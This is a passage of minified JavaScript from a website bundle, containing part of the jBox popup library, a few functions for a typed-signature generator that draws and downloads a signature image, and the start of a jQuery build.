t||0}.bind(this),i=a[l.y||"y"]-(this.pointer&&s&&"y"==e.outside?this.pointer.dimensions.y:0)-t()-parseInt(this.container.css("border-top-width"))-parseInt(this.container.css("border-bottom-width"));this.content.css({height:i>this.options.responsiveMinHeight?i:null}),this._setTitleWidth()}n=this._exposeDimensions()}.bind(this);e.responsiveHeight&&h(),e.responsiveHeight&&!c.x&&l.x&&n.x>a[l.x]&&a[this._getOpp(l.x)]>a[l.x]&&(l.x=this._getOpp(l.x))&&(c.x=!0),e.adjustPosition&&"move"!=e.adjustPosition&&(c.x&&u(),c.y&&h())}var d={},p=function(i){if("number"!=t.type(e.position[i])){var o=e.attributes[i]="x"==i?"left":"top";if(d[o]=r[o],"center"==e.position[i])return d[o]+=Math.ceil((r[i]-n[i])/2),void("mouse"!=this.target&&this.target[0]&&this.target[0]==t(window)[0]&&(d[o]+=.5*(e.adjustDistance[o]-e.adjustDistance[this._getOpp(o)])));o!=e.position[i]&&(d[o]+=r[i]-n[i]),(e.outside==i||"xy"==e.outside)&&(d[o]+=n[i]*(o!=e.position[i]?1:-1))}else d[e.attributes[i]]=e.position[i]}.bind(this);if(p("x"),p("y"),this.pointer&&"target"==e.pointTo&&"number"!=t.type(e.position.x)&&"number"!=t.type(e.position.y)){var f=0;if("center"===this.pointer.align)"center"!=e.position[this._getOpp(e.outside)]&&(f+=n[this._getOpp(e.outside)]/2);else if("center"===e.position[this._getOpp(e.outside)])f+=(n[this._getOpp(e.outside)]/2-this.pointer.dimensions[this._getOpp(e.outside)]/2)*(this.pointer.align==this._getTL(this.pointer.align)?1:-1);else f+=this.pointer.align!=e.position[this._getOpp(e.outside)]?n[this._getOpp(e.outside)]*(-1!==t.inArray(this.pointer.align,["top","left"])?1:-1)+this.pointer.dimensions[this._getOpp(e.outside)]/2*(-1!==t.inArray(this.pointer.align,["top","left"])?-1:1):this.pointer.dimensions[this._getOpp(e.outside)]/2*(-1!==t.inArray(this.pointer.align,["top","left"])?1:-1);f*=e.position[this._getOpp(e.outside)]==this.pointer.alignAttribute?-1:1,f+=this.pointer.offset*(this.pointer.align==this._getOpp(this._getTL(this.pointer.align))?1:-1),d[this._getTL(this._getOpp(this.pointer.xy))]+=f}if(d[e.attributes.x]+=e.offset.x,d[e.attributes.y]+=e.offset.y,this.wrapper.css(d),e.adjustPosition){this.positionAdjusted&&(this.pointer&&this.wrapper.css("padding",0).css("padding-"+this._getOpp(this.outside),this.pointer.dimensions[this._getXY(this.outside)]).removeClass("jBox-pointerPosition-"+this._getOpp(this.pointer.position)).addClass("jBox-pointerPosition-"+this.pointer.position),this.pointer&&this.pointer.element.attr("class","jBox-pointer jBox-pointer-"+this._getOpp(this.outside)).css(this.pointer.margin),this.positionAdjusted=!1,this.flipped=!1);var m=i.top>d.top-(e.adjustDistance.top||0),g=i.right<d.left+n.x+(e.adjustDistance.right||0),v=i.bottom<d.top+n.y+(e.adjustDistance.bottom||0),y=i.left>d.left-(e.adjustDistance.left||0),b=y?"left":g?"right":null,x=m?"top":v?"bottom":null;if(b||x){if(("Modal"==this.type||"Confirm"==this.type)&&"number"==t.type(this.options.position.x)&&"number"==t.type(this.options.position.y)){var w=0,_=0;return this.options.holdPosition&&(y?w=i.left-(d.left-(e.adjustDistance.left||0)):g&&(w=i.right-(d.left+n.x+(e.adjustDistance.right||0))),m?_=i.top-(d.top-(e.adjustDistance.top||0)):v&&(_=i.bottom-(d.top+n.y+(e.adjustDistance.bottom||0))),this.options.position.x=Math.max(i.top,this.options.position.x+w),this.options.position.y=Math.max(i.left,this.options.position.y+_),p("x"),p("y"),this.wrapper.css(d)),this._fireEvent("onPosition"),this}if(!0===e.adjustPosition||"flip"===e.adjustPosition){var k=function(t){this.wrapper.css(this._getTL(t),d[this._getTL(t)]+(n[this._getXY(t)]+e.offset[this._getXY(t)]*("top"==t||"left"==t?-2:2)+r[this._getXY(t)])*("top"==t||"left"==t?1:-1)),this.pointer&&this.wrapper.removeClass("jBox-pointerPosition-"+this.pointer.position).addClass("jBox-pointerPosition-"+this._getOpp(this.pointer.position)).css("padding",0).css("padding-"+t,this.pointer.dimensions[this._getXY(t)]),this.pointer&&this.pointer.element.attr("class","jBox-pointer jBox-pointer-"+t),this.positionAdjusted=!0,this.flipped=!0}.bind(this);c.x&&k(this.options.position.x),c.y&&k(this.options.position.y)}var T="x"==this._getXY(this.outside)?x:b;if(this.pointer&&"target"==e.pointTo&&"flip"!=e.adjustPosition&&this._getXY(T)==this._getOpp(this._getXY(this.outside))){if("center"==this.pointer.align)var C=n[this._getXY(T)]/2-this.pointer.dimensions[this._getOpp(this.pointer.xy)]/2-parseInt(this.pointer.element.css("margin-"+this.pointer.alignAttribute))*(T!=this._getTL(T)?-1:1);else C=T==this.pointer.alignAttribute?parseInt(this.pointer.element.css("margin-"+this.pointer.alignAttribute)):n[this._getXY(T)]-parseInt(this.pointer.element.css("margin-"+this.pointer.alignAttribute))-this.pointer.dimensions[this._getXY(T)];var S=T==this._getTL(T)?i[this._getTL(T)]-d[this._getTL(T)]+e.adjustDistance[T]:-1*(i[this._getOpp(this._getTL(T))]-d[this._getTL(T)]-e.adjustDistance[T]-n[this._getXY(T)]);T==this._getOpp(this._getTL(T))&&d[this._getTL(T)]-S<i[this._getTL(T)]+e.adjustDistance[this._getTL(T)]&&(S-=i[this._getTL(T)]+e.adjustDistance[this._getTL(T)]-(d[this._getTL(T)]-S)),(S=Math.min(S,C))<=C&&S>0&&(this.pointer.element.css("margin-"+this.pointer.alignAttribute,parseInt(this.pointer.element.css("margin-"+this.pointer.alignAttribute))-S*(T!=this.pointer.alignAttribute?-1:1)),this.wrapper.css(this._getTL(T),d[this._getTL(T)]+S*(T!=this._getTL(T)?-1:1)),this.positionAdjusted=!0)}}}return this._fireEvent("onPosition"),this},n.prototype.unscroll=function(t){if(this.set=function(t,e){window.unscrollStore||(window.unscrollStore={}),window.unscrollStore[t]=e},this.get=function(t){return window.unscrollStore?window.unscrollStore[t]:null},this.getScrollbarWidth=function(){if(this.get("scrollbarWidth"))return this.get("scrollbarWidth")+"px";var t=document.createElement("div");t.style.width="100px",t.style.height="100px",t.style.overflow="scroll",t.style.position="absolute",t.style.top="-10000",document.body.appendChild(t);var e=t.offsetWidth-t.clientWidth;return document.body.removeChild(t),this.set("scrollbarWidth",e),e+"px"},this.getElementsToAdjust=function(t){!t&&(t=[]),"string"==typeof t&&(t=[[t,"padding-right"]]),t.forEach((function(e,n){"string"==typeof e&&(t[n]=[e,"padding-right"])}));for(var e=!1,n=0;n<t.length;n++)-1!==t[n][0].indexOf("body")&&(e=!0);return!1===e&&t.push(["body","padding-right"]),t},this.pageHasScrollbar=function(){return this.getScrollbarWidth()&&document.body.offsetHeight>window.innerHeight},this.pageHasScrollbar()){t=this.getElementsToAdjust(t);for(var n=0;n<t.length;n++)for(var i=document.querySelectorAll(t[n][0]),o=0;o<i.length;o++){if(i[o].getAttribute("data-unscroll"))return;var r=t[n][1],s=window.getComputedStyle(i[o]).getPropertyValue(r);i[o].setAttribute("data-unscroll",r),s||(s="0px");var a="padding-right"==r||"right"==r?"+":"-";i[o].style[r]="calc("+s+" "+a+" "+this.getScrollbarWidth()+")"}}(function e(){if(!document.getElementById("unscroll-class-name")){var e=document.head||document.getElementsByTagName("head")[0],n=document.createElement("style");n.type="text/css",n.setAttribute("id","unscroll-class-name"),n.appendChild(document.createTextNode(".unscrollable { overflow: hidden !important; }")),e.appendChild(n)}})(),document.body.classList.add("unscrollable")},n.prototype.unscroll.reset=function(){for(var t=document.querySelectorAll("[data-unscroll]"),e=0;e<t.length;e++){var n=t[e].getAttribute("data-unscroll");t[e].style[n]=null,t[e].removeAttribute("data-unscroll")}document.body.classList.remove("unscrollable")},n.prototype.open=function(e){if(!e&&(e={}),this.isDestroyed)return this;if(!this.wrapper&&this._create(),!this._styles&&(this._styles=t("<style/>").append(this._animationCSS).appendTo(t("head"))),this.timer&&clearTimeout(this.timer),this._blockBodyClick(),this.isDisabled)return this;this.options.closeOnEsc&&t(document).on("keyup.jBox-"+this.id,function(t){27==t.keyCode&&this.close({ignoreDelay:!0})}.bind(this)),!0!==this.options.closeOnClick&&"body"!==this.options.closeOnClick||(t("body").on("click.jBox-"+this.id+" tap.jBox-"+this.id,function(t){this.blockBodyClick||"body"==this.options.closeOnClick&&(t.target==this.wrapper[0]||this.wrapper.has(t.target).length)||this.close({ignoreDelay:!0})}.bind(this)),this.isTouchDevice&&t("body > *").on("click.jBox-"+this.id+" tap.jBox-"+this.id,(function(){return!0})));var i=function(){!0===this.adjustZIndexOnOpen&&(n.zIndexMax=Math.max(parseInt(this.wrapper.css("zIndex"),10),this.options.zIndex,n.zIndexMax||0,n.zIndexMaxDragover||0)+2,this.wrapper.css("zIndex",n.zIndexMax),this.options.zIndex=n.zIndexMax),this.source&&this.options.getTitle&&this.source.attr(this.options.getTitle)&&this.setTitle(this.source.attr(this.options.getTitle),!0),this.source&&this.options.getContent&&(this.source.data("jBox-getContent")?this.setContent(this.source.data("jBox-getContent"),!0):this.source.attr(this.options.getContent)?this.setContent(this.source.attr(this.options.getContent),!0):"html"==this.options.getContent&&this.setContent(this.source.html(),!0)),this._fireEvent("onOpen"),(this.options.ajax&&(this.options.ajax.url||this.source&&this.source.attr(this.options.ajax.getURL))&&(!this.ajaxLoaded||this.options.ajax.reload)||e.ajax&&(e.ajax.url||e.ajax.data))&&("strict"==this.options.ajax.reload||!this.source||!this.source.data("jBox-ajax-data")||e.ajax&&(e.ajax.url||e.ajax.data)?this.ajax(e.ajax||null,!0):this.setContent(this.source.data("jBox-ajax-data"))),(!this.positionedOnOpen||this.options.repositionOnOpen)&&this.position(e)&&(this.positionedOnOpen=!0),this.isClosing&&this._abortAnimation(),this.isOpen||(this.isOpen=!0,this.options.autoClose&&(this.options.delayClose=this.options.autoClose)&&this.close(),this._attachEvents(),this.options.blockScroll&&(this.options.blockScrollAdjust?n.blockScrollScopes?n.blockScrollScopes++:(n.blockScrollScopes=1,this.unscroll(Array.isArray(this.options.blockScrollAdjust)||"string"==typeof this.options.blockScrollAdjust?this.options.blockScrollAdjust:null)):t("body").addClass("jBox-blockScroll-"+this.id)),this.options.overlay&&(this._showOverlay(),this.position()),this.options.animation&&!this.isClosing&&this._animate("open"),this.options.audio&&this.options.audio.open&&this.audio(this.options.audio.open,this.options.volume.open),this.options.fade?this.wrapper.stop().animate({opacity:1},{queue:!1,duration:this.options.fade,start:function(){this.isOpening=!0,this.wrapper.css({display:"block"})}.bind(this),complete:function(){this._fireEvent("onOpenComplete")}.bind(this),always:function(){this.isOpening=!1,setTimeout(function(){this.positionOnFadeComplete&&this.position()&&(this.positionOnFadeComplete=!1)}.bind(this),10)}.bind(this)}):(this.wrapper.css({display:"block",opacity:1}),this.positionOnFadeComplete&&this.position()&&(this.positionOnFadeComplete=!1),this._fireEvent("onOpenComplete")))}.bind(this);return!this.options.delayOpen||this.isOpen||this.isClosing||e.ignoreDelay?i():this.timer=setTimeout(i,this.options.delayOpen),this},n.prototype.close=function(e){if(e||(e={}),t("body").off("click.jBox-"+this.id+" tap.jBox-"+this.id),this.isTouchDevice&&t("body > *").off("click.jBox-"+this.id+" tap.jBox-"+this.id),this.isDestroyed||this.isClosing)return this;if(this.timer&&clearTimeout(this.timer),this._blockBodyClick(),this.isDisabled)return this;var i=function(){if(this._fireEvent("onClose"),this.options.cancelAjaxOnClose&&this.cancelAjax(),this.isOpen){this.isOpen=!1,this._detachEvents(),this.options.blockScroll&&(this.options.blockScrollAdjust?!(n.blockScrollScopes=n.blockScrollScopes?--n.blockScrollScopes:0)&&this.unscroll.reset():t("body").removeClass("jBox-blockScroll-"+this.id)),this.options.overlay&&this._hideOverlay(),this.options.animation&&!this.isOpening&&this._animate("close"),this.options.audio&&this.options.audio.close&&this.audio(this.options.audio.close,this.options.volume.close);var e=this.isTouchDevice&&"mouse"==this.options.target?0:this.options.fade;e?this.wrapper.stop().animate({opacity:0},{queue:!1,duration:e,start:function(){this.isClosing=!0}.bind(this),complete:function(){this.wrapper.css({display:"none"}),this._fireEvent("onCloseComplete")}.bind(this),always:function(){this.isClosing=!1}.bind(this)}):(this.wrapper.css({display:"none",opacity:0}),this._fireEvent("onCloseComplete"))}}.bind(this);if(e.ignoreDelay||this.isTouchDevice&&"mouse"==this.options.target)i();else if((this.options.delayOnHover||this.options.showCountdown)&&this.options.delayClose>10){var o=this,r=this.options.delayClose,s=Date.now();if(this.options.showCountdown&&!this.inner){var a=t('<div class="jBox-countdown" />');this.inner=t('<div class="jBox-countdown-inner" />'),a.prepend(this.inner),t("#"+this.id).append(a)}this.countdown=function(){var t=Date.now();o.isHovered||(r-=t-s),s=t,r>0?(o.options.showCountdown&&o.inner.css("width",100*r/o.options.delayClose+"%"),window.requestAnimationFrame(o.countdown)):i()},window.requestAnimationFrame(this.countdown)}else this.timer=setTimeout(i,Math.max(this.options.delayClose,10));return this},n.prototype.toggle=function(t){return this[this.isOpen?"close":"open"](t),this},n.prototype.disable=function(){return this.isDisabled=!0,this},n.prototype.enable=function(){return this.isDisabled=!1,this},n.prototype.hide=function(){return this.disable(),this.wrapper&&(this.cacheWrapperDisplay=this.wrapper.css("display"),this.wrapper.css({display:"none"})),this.overlay&&(this.cacheOverlayDisplay=this.overlay.css("display"),this.overlay.css({display:"none"})),this},n.prototype.show=function(){return this.enable(),this.wrapper&&this.cacheWrapperDisplay&&(this.wrapper.css({display:this.cacheWrapperDisplay}),this.cacheWrapperDisplay=null),this.overlay&&this.cacheOverlayDisplay&&(this.overlay.css({display:this.cacheOverlayDisplay}),this.cacheOverlayDisplay=null),this},n.prototype.ajax=function(e,n){e||(e={}),t.each([["getData","data"],["getURL","url"]],function(t,n){this.options.ajax[n[0]]&&!e[n[1]]&&this.source&&null!=this.source.attr(this.options.ajax[n[0]])&&(e[n[1]]=this.source.attr(this.options.ajax[n[0]])||"")}.bind(this));var i=t.extend(!0,{},this.options.ajax);this.cancelAjax();var o=e.beforeSend||i.beforeSend||function(){},r=e.complete||i.complete||function(){},s=e.success||i.success||function(){},a=e.error||i.error||function(){},l=t.extend(!0,i,e);return l.beforeSend=function(e){l.loadingClass&&this.wrapper.addClass(!0===l.loadingClass?"jBox-loading":l.loadingClass),l.spinner&&(this.spinnerDelay=setTimeout(function(){this.wrapper.addClass("jBox-loading-spinner"),l.spinnerReposition&&(n?this.positionOnFadeComplete=!0:this.position()),this.spinner=t(!0!==l.spinner?l.spinner:'<div class="jBox-spinner"></div>').appendTo(this.container),this.titleContainer&&"absolute"==this.spinner.css("position")&&this.spinner.css({transform:"translateY("+.5*this.titleContainer.outerHeight()+"px)"})}.bind(this),""==this.content.html()?0:l.spinnerDelay||0)),o.bind(this)(e)}.bind(this),l.complete=function(t){this.spinnerDelay&&clearTimeout(this.spinnerDelay),this.wrapper.removeClass("jBox-loading jBox-loading-spinner jBox-loading-spinner-delay"),this.spinner&&this.spinner.length&&this.spinner.remove()&&l.spinnerReposition&&(n?this.positionOnFadeComplete=!0:this.position()),this.ajaxLoaded=!0,r.bind(this)(t)}.bind(this),l.success=function(t){l.setContent&&this.setContent(t,!0)&&(n?this.positionOnFadeComplete=!0:this.position()),l.setContent&&this.source&&this.source.data("jBox-ajax-data",t),s.bind(this)(t)}.bind(this),l.error=function(t){a.bind(this)(t)}.bind(this),this.ajaxRequest=t.ajax(l),this},n.prototype.cancelAjax=function(){this.ajaxRequest&&(this.ajaxRequest.abort(),this.ajaxLoaded=!1)},n.prototype.audio=function(e,i){if(!e)return this;if(!n._audio&&(n._audio={}),!n._audio[e]){var o=t("<audio/>");t("<source/>",{src:e+".mp3"}).appendTo(o),t("<source/>",{src:e+".ogg"}).appendTo(o),n._audio[e]=o[0]}n._audio[e].volume=Math.min((null!=i?i:100)/100,1);try{n._audio[e].pause(),n._audio[e].currentTime=0}catch(r){}return n._audio[e].play(),this},n._animationSpeeds={tada:1e3,tadaSmall:1e3,flash:500,shake:400,pulseUp:250,pulseDown:250,popIn:250,popOut:250,fadeIn:200,fadeOut:200,slideUp:400,slideRight:400,slideLeft:400,slideDown:400},n.prototype.animate=function(t,e){!e&&(e={}),!this.animationTimeout&&(this.animationTimeout={}),!e.element&&(e.element=this.wrapper),!e.element.data("jBox-animating-id")&&e.element.data("jBox-animating-id",n._getUniqueElementID()),e.element.data("jBox-animating")&&(e.element.removeClass(e.element.data("jBox-animating")).data("jBox-animating",null),this.animationTimeout[e.element.data("jBox-animating-id")]&&clearTimeout(this.animationTimeout[e.element.data("jBox-animating-id")])),e.element.addClass("jBox-animated-"+t).data("jBox-animating","jBox-animated-"+t),this.animationTimeout[e.element.data("jBox-animating-id")]=setTimeout((function(){e.element.removeClass(e.element.data("jBox-animating")).data("jBox-animating",null),e.complete&&e.complete()}),n._animationSpeeds[t])},n.prototype.swipeDetector=function(e,n){var s=0,a=0,l=0,c=0,u=0;return n=t.extend({swipeThreshold:70,useOnlyTouch:!1},n),e.on("mousedown touchstart",(function i(t){n.useOnlyTouch&&!t.originalEvent.touches||(t.originalEvent.touches&&(t=t.originalEvent.touches[0]),0===s&&(s=1,a=t.clientX,l=t.clientY))})),t("html").on("mouseup touchend",(function o(){2===s&&(s=0,Math.abs(c)>Math.abs(u)&&Math.abs(c)>n.swipeThreshold?c<0?e.trigger(t.Event("swipeLeft.sd")):e.trigger(t.Event("swipeRight.sd")):Math.abs(u)>n.swipeThreshold&&(u<0?e.trigger(t.Event("swipeUp.sd")):e.trigger(t.Event("swipeDown.sd"))))})),t("html").on("mousemove touchmove",(function r(t){if(1===s){t.originalEvent.touches&&(t=t.originalEvent.touches[0]);var e=t.clientX-a,i=t.clientY-l;(Math.abs(e)>n.swipeThreshold||Math.abs(i)>n.swipeThreshold)&&(s=2,c=e,u=i)}})),e},n.prototype.destroy=function(){return this.detach(),this.isOpen&&this.close({ignoreDelay:!0}),this.wrapper&&this.wrapper.remove(),this.overlay&&this.overlay.remove(),this._styles&&this._styles.remove(),this.isDestroyed=!0,this},n._getUniqueID=(e=1,function(){return e++}),n._getUniqueElementID=function(){var t=1;return function(){return t++}}(),n._pluginOptions={},n.plugin=function(t,e){n._pluginOptions[t]=e},t.fn.jBox=function(e,i){return!e&&(e={}),!i&&(i={}),new n(e,t.extend(i,{attach:this}))},n}function createTypedSignature(){function t(){var t=$("#type-signature").val();if(""==t)return!1;$(".created-signature").attr("data-text",t),$("#create-typed-signature").text("Update"),$(".created-signatures").fadeIn("300",(function(){$("#editor-modal").modal("hide")}))}$("#create-typed-signature, #reset-typed-signature").on("click",(function(){t()})),$("#type-signature").keypress((function(e){13==e.keyCode&&t()}))}function loadMoreSignatures(){itemsSize=$(".created-signature").length,x=6,$(".created-signature:lt("+x+")").fadeIn("300"),$("#load-more-signatures").on("click",(function(){x=x+6<=itemsSize?x+6:itemsSize,$(".created-signature:lt("+x+")").fadeIn("300"),x>=31&&$("#load-more-signatures").hide()}))}function editSignature(){var t=document.querySelector(".typed-signature-editor canvas");if(document.body.contains(t)){var e=t.getContext("2d");$(".created-signature").on("click",(function(){function n(){e.setTransform(1,0,-l,1,0,0),e.fillText(a,t.width/2+l*c,t.height/2,t.width-l*c)}function i(){e.clearRect(0,0,t.width,t.height)}var r,s=$(this).css("font-family"),a=$(".created-signature").attr("data-text"),l=0,c=60;$("#editor-modal").modal("show"),setTimeout((function(){$(".range-slider").slider()}),300),i(),e.fillStyle="rgba(255, 255, 255, 100)",e.fillRect(0,0,t.width,t.height),e.fillStyle="#000000",e.textBaseline="middle",e.textAlign="center",e.font="48px "+s,n(),$(".color-controls input").on("change",(function(){var i=$(this).val();e.clearRect(0,0,t.width,t.height),function o(){$(".signature-transparent input").is(":checked")?e.clearRect(0,0,t.width,t.height):(e.fillStyle="rgba(255, 255, 255, 100)",e.fillRect(0,0,t.width,t.height))}(),e.fillStyle=i,n()})),$(".range-slider").on("change",(function(){l=$(this).val(),i(),n()})),$(".signature-transparent input").on("change",(function(){if($(".signature-transparent input").is(":checked")){e.clearRect(0,0,t.width,t.height);var i=$(".color-controls input:checked").val();e.fillStyle=i,n()}else e.fillStyle="rgba(255, 255, 255, 100)",e.fillRect(0,0,t.width,t.height),i=$(".color-controls input:checked").val(),e.fillStyle=i,n();r=t.toDataURL("image/png"),$(".signature-preview").css("background-image","url("+r+")")})),$("#signature-save").on("click",(function(){r=t.toDataURL("image/png"),$(".signature-preview").css("background-image","url("+r+")"),$("#preview-modal").modal("show")})),$("#signature-preview-close").on("click",(function(){$("#preview-modal").modal("hide")})),$("#preview-modal").on("hidden.bs.modal",(function(){$("body").addClass("modal-open")}))}))}}function saveImageDownload(){var t=document.getElementById("edit-typed-signature");document.body.contains(t)||(t=document.getElementById("canvas_signature"));var e=t.toDataURL("image/png");new Blob([e],{type:"image/png"}),t.toBlob((function(t){saveAs(t,"signature.png")}))}!function(t,e){"use strict";"object"==typeof module&&"object"==typeof module.exports?module.exports=t.document?e(t,!0):function(t){if(!t.document)throw new Error("jQuery requires a window with a document");return e(t)}:e(t)}("undefined"!=typeof window?window:this,(function(t,e){"use strict";function n(t,e,n){var i,o,r=(n=n||xt).createElement("script");if(r.text=t,e)for(i in wt)(o=e[i]||e.getAttribute&&e.getAttribute(i))&&r.setAttribute(i,o);n.head.appendChild(r).parentNode.removeChild(r)}function i(t){return null==t?t+"":"object"==typeof t||"function"==typeof t?dt[pt.call(t)]||"object":typeof t}function o(t){var e=!!t&&"length"in t&&t.length,n=i(t);return!yt(t)&&!bt(t)&&("array"===n||0===e||"number"==typeof e&&e>0&&e-1 in t)}function r(t,e){return t.nodeName&&t.nodeName.toLowerCase()===e.toLowerCase()}function s(t,e){return e?"\0"===t?"�":t.slice(0,-1)+"\\"+t.charCodeAt(t.length-1).toString(16)+" ":"\\"+t}function a(t,e,n){return yt(e)?Tt.grep(t,(function(t,i){return!!e.call(t,i,t)!==n})):e.nodeType?Tt.grep(t,(function(t){return t===e!==n})):"string"!=typeof e?Tt.grep(t,(function(t){return ht.call(e,t)>-1!==n})):Tt.filter(e,t,n)}function l(t,e){for(;(t=t[e])&&1!==t.nodeType;);return t}function u(t){return t}function h(t){throw t}function d(t,e,n,i){var o;try{t&&yt(o=t.promise)?o.call(t).done(e).fail(n):t&&yt(o=t.then)?o.call(t,e,n):e.apply(void 0,[t].slice(i))}catch(t){n.apply(void 0,[t])}}function p(){xt.removeEventListener("DOMContentLoaded",p),t.removeEventListener("load",p),Tt.ready()}function f(t,e){return e.toUpperCase()}function m(t){return t.replace(Vt,"ms-").replace(Ut,f)}function g(){this.expando=Tt.expando+g.uid++}function y(t,e,n){var i;if(void 0===n&&1===t.nodeType)if(i="data-"+e.replace(Gt,"-$&").toLowerCase(),"string"==typeof(n=t.getAttribute(i))){try{n=function v(t){return"true"===t||"false"!==t&&("null"===t?null:t===+t+""?+t:Kt.test(t)?JSON.parse(t):t)}(n)}catch(o){}Qt.set(t,e,n)}else n=void 0;return n}function b(t,e,n,i){var o,r,s=20,a=i?function(){return i.cur()}:function(){return Tt.css(t,e,"")},l=a(),c=n&&n[3]||(Tt.cssNumber[e]?"":"px"),u=t.nodeType&&(Tt.cssNumber[e]||"px"!==c&&+l)&&Jt.exec(Tt.css(t,e));if(u&&u[3]!==c){for(l/=2,c=c||u[3],u=+l||1;s--;)Tt.style(t,e,u+c),(1-r)*(1-(r=a()/l||.5))<=0&&(s=0),u/=r;u*=2,Tt.style(t,e,u+c),n=n||[]}return n&&(u=+u||+l||0,o=n[1]?u+(n[1]+1)*n[2]:+n[2],i&&(i.unit=c,i.start=u,i.end=o)),o}function x(t){var e,n=t.ownerDocument,i=t.nodeName,o=re[i];return o||(e=n.body.appendChild(n.createElement(i)),o=Tt.css(e,"display"),e.parentNode.removeChild(e),"none"===o&&(o="block"),re[i]=o,o)}function w(t,e){for(var n,i,o=[],r=0,s=t.length;r<s;r++)(i=t[r]).style&&(n=i.style.display,e?("none"===n&&(o[r]=Yt.get(i,"display")||null,o[r]||(i.style.display="")),""===i.style.display&&oe(i)&&(o[r]=x(i))):"none"!==n&&(o[r]="none",Yt.set(i,"display",n)));for(r=0;r<s;r++)null!=o[r]&&(t[r].style.display=o[r]);return t}function _(t,e){var n;return n=void 0!==t.getElementsByTagName?t.getElementsByTagName(e||"*"):void 0!==t.querySelectorAll?t.querySelectorAll(e||"*"):[],void 0===e||e&&r(t,e)?Tt.merge([t],n):n}function k(t,e){for(var n=0,i=t.length;n<i;n++)Yt.set(t[n],"globalEval",!e||Yt.get(e[n],"globalEval"))}function T(t,e,n,o,r){for(var s,a,l,c,u,h,d=e.createDocumentFragment(),p=[],f=0,m=t.length;f<m;f++)if((s=t[f])||0===s)if("object"===i(s))Tt.merge(p,s.nodeType?[s]:s);else if(de.test(s)){for(a=a||d.appendChild(e.createElement("div")),l=(ce.exec(s)||["",""])[1].toLowerCase(),c=he[l]||he._default,a.innerHTML=c[1]+Tt.htmlPrefilter(s)+c[2],h=c[0];h--;)a=a.lastChild;Tt.merge(p,a.childNodes),(a=d.firstChild).textContent=""}else p.push(e.createTextNode(s));for(d.textContent="",f=0;s=p[f++];)if(o&&Tt.inArray(s,o)>-1)r&&r.push(s);else if(u=ne(s),a=_(d.appendChild(s),"script"),u&&k(a),n)for(h=0;s=a[h++];)ue.test(s.type||"")&&n.push(s);return d}function C(){return!0}function S(){return!1}function E(t,e,n,i,o,r){var s,a;if("object"==typeof e){for(a in"string"!=typeof n&&(i=i||n,n=void 0),e)E(t,a,n,i,e[a],r);return t}if(null==i&&null==o?(o=n,i=n=void 0):null==o&&("string"==typeof n?(o=i,i=void 0):(o=i,i=n,n=void 0)),!1===o)o=S;else if(!o)return t;return 1===r&&(s=o,(o=function(t){return Tt().off(t),s.apply(this,arguments)}).guid=s.guid||(s.guid=Tt.guid++)),t.each((function(){Tt.event.add(this,e,o,i,n)}))}function j(t,e,n){n?(Yt.set(t,e,!1),Tt.event.add(t,e,{namespace:!1,handler:function(t){var n,i=Yt.get(this,e);if(1&t.isTrigger&&this[e]){if(i)(Tt.event.special[e]||{}).delegateType&&t.stopPropagation();else if(i=lt.call(arguments),Yt.set(this,e,i),this[e](),n=Yt.get(this,e),Yt.set(this,e,!1),i!==n)return t.stopImmediatePropagation(),t.preventDefault(),n}else i&&(Yt.set(this,e,Tt.event.trigger(i[0],i.slice(1),this)),t.stopPropagation(),t.isImmediatePropagationStopped=C)}})):void 0===Yt.get(t,e)&&Tt.event.add(t,e,C)}function A(t,e){return r(t,"table")&&r(11!==e.nodeType?e:e.firstChild,"tr")&&Tt(t).children("tbody")[0]||t}function M(t){return t.type=(null!==t.getAttribute("type"))+"/"+t.type,t}function D(t){return"true/"===(t.type||"").slice(0,5)?t.type=t.type.slice(5):t.removeAttribute("type"),t}function L(t,e){var n,i,o,r,s,a;if(1===e.nodeType){if(Yt.hasData(t)&&(a=Yt.get(t).events))for(o in Yt.remove(e,"handle events"),a)for(n=0,i=a[o].length;n<i;n++)Tt.event.add(e,o,a[o][n]);Qt.hasData(t)&&(r=Qt.access(t),s=Tt.extend({},r),Qt.set(e,s))}}function P(t,e){var n=e.nodeName.toLowerCase();"input"===n&&le.test(t.type)?e.checked=t.checked:"input"!==n&&"textarea"!==n||(e.defaultValue=t.defaultValue)}function $(t,e,i,o){e=ct(e);var r,s,a,l,c,u,h=0,d=t.length,p=d-1,f=e[0],m=yt(f);if(m||d>1&&"string"==typeof f&&!vt.checkClone&&me.test(f))return t.each((function(n){var r=t.eq(n);m&&(e[0]=f.call(this,n,r.html())),$(r,e,i,o)}));if(d&&(s=(r=T(e,t[0].ownerDocument,!1,t,o)).firstChild,1===r.childNodes.length&&(r=s),s||o)){for(l=(a=Tt.map(_(r,"script"),M)).length;h<d;h++)c=r,h!==p&&(c=Tt.clone(c,!0,!0),l&&Tt.merge(a,_(c,"script"))),i.call(t[h],c,h);if(l)for(u=a[a.length-1].ownerDocument,Tt.map(a,D),h=0;h<l;h++)c=a[h],ue.test(c.type||"")&&!Yt.access(c,"globalEval")&&Tt.contains(u,c)&&(c.src&&"module"!==(c.type||"").toLowerCase()?Tt._evalUrl&&!c.noModule&&Tt._evalUrl(c.src,{nonce:c.nonce||c.getAttribute("nonce")},u):n(c.textContent.replace(ge,""),c,u))}return t}function O(t,e,n){for(var i,o=e?Tt.filter(e,t):t,r=0;null!=(i=o[r]);r++)n||1!==i.nodeType||Tt.cleanData(_(i)),i.parentNode&&(n&&ne(i)&&k(_(i,"script")),i.parentNode.removeChild(i));return t}function B(t,e,n){var i,o,r,s,a=ye.test(e),l=t.style;return(n=n||be(t))&&(s=n.getPropertyValue(e)||n[e],a&&s&&(s=s.replace(At,"$1")||void 0),""!==s||ne(t)||(s=Tt.style(t,e)),!vt.pixelBoxStyles()&&ve.test(s)&&we.test(e)&&(i=l.width,o=l.minWidth,r=l.maxWidth,l.minWidth=l.maxWidth=l.width=s,s=n.width,l.width=i,l.minWidth=o,l.maxWidth=r)),void 0!==s?s+"":s}function I(t,e){return{get:function(){if(!t())return(this.get=e).apply(this,arguments);delete this.get}}}function R(t){return Tt.cssProps[t]||Te[t]||(t in ke?t:Te[t]=function N(t){for(var e=t[0].toUpperCase()+t.slice(1),n=_e.length;n--;)if((t=_e[n]+e)in ke)return t}(t)||t)}function H(t,e,n){var i=Jt.exec(e);return i?Math.max(0,i[2]-(n||0))+(i[3]||"px"):e}function q(t,e,n,i,o,r){var s="width"===e?1:0,a=0,l=0,c=0;if(n===(i?"border":"content"))return 